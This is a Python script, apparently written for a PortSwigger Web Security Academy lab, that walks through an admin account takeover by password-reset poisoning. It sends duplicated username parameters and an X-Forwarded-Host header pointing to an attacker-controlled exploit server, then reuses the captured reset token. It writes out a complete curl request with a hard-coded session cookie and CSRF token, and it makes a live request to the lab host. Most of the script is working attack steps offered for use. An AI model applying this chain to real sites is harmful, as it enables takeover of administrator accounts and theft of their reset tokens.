#!/usr/bin/env python3
import requests

# This script demonstrates the complete attack chain

print("🎯 ADMIN ACCOUNT TAKEOVER ATTACK")
print("=" * 50)

print("\n📋 STEP-BY-STEP INSTRUCTIONS:")
print("-" * 30)

print("\n1️⃣ SET UP EXPLOIT SERVER:")
print("   - Go to your PortSwigger lab exploit server")
print("   - Upload the exploit_page.html file")
print("   - Note your exploit server URL (e.g., exploit-abc123.web-security-academy.net)")

print("\n2️⃣ TRIGGER THE ATTACK:")
print("   Use Burp Suite or curl to send this request:")
print()
print("   POST /forgot-password HTTP/2")
print("   Host: 0a0a004e034f7a8182e93d0c004d00b7.web-security-academy.net")
print("   X-Forwarded-Host: [YOUR-EXPLOIT-SERVER-URL]")
print("   Cookie: session=34ERCypmj8Hg3MDNkK4ULVsD1BVFXsrL")
print("   Content-Type: application/x-www-form-urlencoded")
print()
print("   csrf=YwhAhSyhUwrK4ym9guuBkZtag1sonlkl&username=carlos&username=administrator")

print("\n3️⃣ HOW THE ATTACK WORKS:")
print("   ✅ Parameter Pollution: 'carlos' parameter bypasses frontend validation")
print("   ✅ Second 'administrator' parameter targets the admin account")
print("   ✅ X-Forwarded-Host redirects reset URL to your exploit server")
print("   ✅ Admin clicks poisoned reset link → token captured")

print("\n4️⃣ CAPTURE THE TOKEN:")
print("   - Check your exploit server access logs")
print("   - Look for requests to /forgot-password?reset_token=XXXXX")
print("   - Copy the reset token value")

print("\n5️⃣ RESET ADMIN PASSWORD:")
print("   - Go to: https://0a0a004e034f7a8182e93d0c004d00b7.web-security-academy.net/forgot-password?reset_token=CAPTURED_TOKEN")
print("   - Set a new password for the administrator")
print("   - Login as administrator with your new password")

print("\n🔧 CURL COMMAND EXAMPLE:")
print("-" * 25)
print("curl -X POST \\")
print("  'https://0a0a004e034f7a8182e93d0c004d00b7.web-security-academy.net/forgot-password' \\")
print("  -H 'X-Forwarded-Host: YOUR-EXPLOIT-SERVER.web-security-academy.net' \\")
print("  -H 'Cookie: session=34ERCypmj8Hg3MDNkK4ULVsD1BVFXsrL' \\")
print("  -H 'Content-Type: application/x-www-form-urlencoded' \\")
print("  -d 'csrf=YwhAhSyhUwrK4ym9guuBkZtag1sonlkl&username=carlos&username=administrator' \\")
print("  --insecure")

print("\n⚠️  VULNERABILITIES EXPLOITED:")
print("-" * 30)
print("1. Server-Side Parameter Pollution")
print("2. Host Header Injection")
print("3. Missing CSRF validation")
print("4. Password Reset Poisoning")

print("\n🎯 EXPECTED RESULT:")
print("- Admin password reset email sent to real admin")
print("- But reset URL points to your exploit server")
print("- When admin clicks link, you capture their reset token")
print("- Use token to take over admin account")

# Test that our session is still valid
print("\n🔍 Testing current session validity...")

try:
    response = requests.get(
        "https://0a0a004e034f7a8182e93d0c004d00b7.web-security-academy.net/my-account",
        headers={"Cookie": "session=34ERCypmj8Hg3MDNkK4ULVsD1BVFXsrL"},
        verify=False
    )

    if response.status_code == 200:
        print("✅ Session is valid")
    else:
        print(f"⚠️  Session might be expired (Status: {response.status_code})")

except Exception as e:
    print(f"❌ Error checking session: {e}")

print(f"\n🔑 Current session: 34ERCypmj8Hg3MDNkK4ULVsD1BVFXsrL")
print("\nGood luck with the attack! 🚀")